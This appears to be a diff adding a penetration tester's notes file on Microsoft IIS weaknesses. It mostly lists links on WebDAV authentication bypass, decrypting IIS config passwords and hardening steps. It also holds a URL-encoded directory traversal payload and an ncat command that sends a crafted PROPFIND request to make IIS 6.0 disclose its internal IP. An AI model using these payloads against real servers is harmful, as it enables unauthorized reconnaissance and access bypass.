@@ -1,0 +1,27 @@
+# iis
+
+# old school vulns
+http://blog.cassidiancybersecurity.com/post/2014/06/Android-4.4.3%2C-or-fixing-an-old-local-root
+
+# decrypt passwords stored in IIS config files
+https://www.netspi.com/blog/entryid/226/decrypting-iis-passwords-to-break-out-of-the-dmz-part-2
+
+# webdav dir trav
+http://blog.zoller.lu/2009/05/iis-6-webdac-auth-bypass-and-data.html
+http://www.skullsecurity.org/blog/?p=285
+http://unixwiz.net/techtips/ms971492-webdav-vuln.html
+
+=> /private%c0%af/
+
+## IIS 5.x
+# hide the IIS server version from HTTP header (aka. banner)
+http://support.microsoft.com/?id=317741
+
+# disable webdav
+http://support.microsoft.com/?scid=KB;EN-US;Q241520
+
+# internal ip disclosure
+bug IIS 6.0 qui renvoie l'IP interne si Host: pas envoyé
+ou bien via Webdav
+echo -e 'PROPFIND / HTTP/1.0\nUser-Agent: Mozilla/5.0\nAccept: */*\nHost:\nContent-Type: text/xml\nContent-Length: 0\n' | ncat --ssl -vn 10.0.0.1 443
+
